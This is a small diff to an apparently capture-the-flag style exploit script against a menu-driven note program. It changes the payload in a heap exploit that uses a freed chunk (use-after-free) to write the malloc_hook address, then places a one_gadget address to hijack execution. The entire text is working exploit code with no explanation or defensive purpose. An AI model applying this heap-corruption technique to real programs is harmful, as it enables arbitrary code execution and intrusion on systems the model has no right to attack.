@@ -72,7 +72,7 @@ def create_note(size, data):
   sendline_after(f, '[*] Note data: ', data)
   idx = readline_after(f, '[+] Chunk stored Index: ') 
   idx = int(idx)
-  print("chunk idx: %d"%idx)
+  #print("chunk idx: %d"%idx)
   return menu(), idx
 
 
@@ -110,7 +110,7 @@ dbg("malloc_hook")
 dbg("one_gadget")
 _, A = create_note(0x10, b'A' * 0xf)
 delete_note(A)
-edit_note(A, pQ(malloc_hook)* 2)
+edit_note(A, pQ(malloc_hook) + b'\n')
 
 _, X = create_note(0x10, b'\n')
 _, Y = create_note(0x10, pQ(one_gadget) + b'\n')
